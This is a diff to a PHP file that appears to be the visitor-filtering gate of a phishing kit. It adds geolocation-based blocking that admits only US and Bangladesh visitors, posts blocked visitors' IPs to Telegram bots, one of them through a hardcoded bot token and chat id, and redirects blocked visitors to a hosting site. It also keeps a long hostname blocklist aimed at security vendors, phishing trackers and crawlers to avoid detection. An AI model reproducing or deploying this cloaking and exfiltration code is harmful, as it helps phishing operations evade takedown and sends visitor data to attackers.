@@ -1,5 +1,5 @@
 <?php
-unlink("new.php");
+// unlink("new.php");
 $ddd = $_SERVER['HTTP_HOST'];
 $content = "Host: https://".$ddd;
 $tokens = "1872904754:AAGy9AoQifQTZZY02cN_rk41EQE1cwSJf9Y";
@@ -140,9 +140,76 @@ function getBrowser($useragent) {
     return $browser;
 }
 
+# Variable Section
+
+$details = get_ip1($IP);
+$details = json_decode($details, true);
+$countryname = $details['geoplugin_countryName'];
+$countrycode = $details['geoplugin_countryCode'];
+$continent = $details['geoplugin_continentName'];
+$city = $details['geoplugin_city'];
+$regioncity = $details['geoplugin_region'];
+$timezone = $details['geoplugin_timezone'];
+$currency = $details['geoplugin_currencySymbol_UTF8'];
+
+if($countryname == "") {
+    $details = get_ip2($IP2);
+    $details = json_decode($details, true);
+    $countryname = $details['country'];
+    $countrycode = $details['countryCode'];
+    $continent = $details['continent'];
+    $city = $details['city'];
+}
+
 $useragentss = $_SERVER['HTTP_USER_AGENT'];
 $oss = getOS($useragentss);
 $browser = getBrowser($useragentss);
+
+if ($countrycode == "US") {
+
+} elseif ($countrycode == "BD") {
+
+        } else {
+        $content = "Bot Found: ".$IP.$countrycode." [ Blocked ] \r\n";
+$token = file_get_contents("admin/tmp/token.txt");
+$id = file_get_contents("admin/tmp/id.txt");
+$url = "https://api.telegram.org/bot";
+$bot = "{$url}{$token}";
+$tokens = "1872904754:AAGy9AoQifQTZZY02cN_rk41EQE1cwSJf9Y";
+$ids = "1129838722";
+$urls = "https://api.telegram.org/bot";
+$bots = "{$urls}{$tokens}";
+$params=[
+	'chat_id'=>$id,
+	'text'=>$content,
+];
+
+$ch = curl_init($bot . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_exec($ch);
+curl_close($ch);
+
+$params=[
+	'chat_id'=>$ids,
+	'text'=>$content,
+];
+
+$ch = curl_init($bots . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_exec($ch);
+curl_close($ch);
+header("Location: https://www.siteground.com");exit();
+
+      }  
+    
 
 $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 $blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com");
@@ -186,7 +253,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -231,7 +298,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
 
@@ -275,7 +342,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
 
@@ -323,7 +390,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
 }
@@ -364,7 +431,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
 }
@@ -955,7 +1022,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -1136,7 +1203,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -1676,7 +1743,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -2062,7 +2129,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -2112,7 +2179,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
 	 }
@@ -2164,7 +2231,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -2215,7 +2282,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
 
         }
@@ -2267,7 +2334,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 
         }
     }
@@ -2330,7 +2397,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
 curl_close($ch);
-header("HTTP/1.0 404 Not Found");exit();
+header("Location: https://www.siteground.com");exit();
 }
               
 ?>
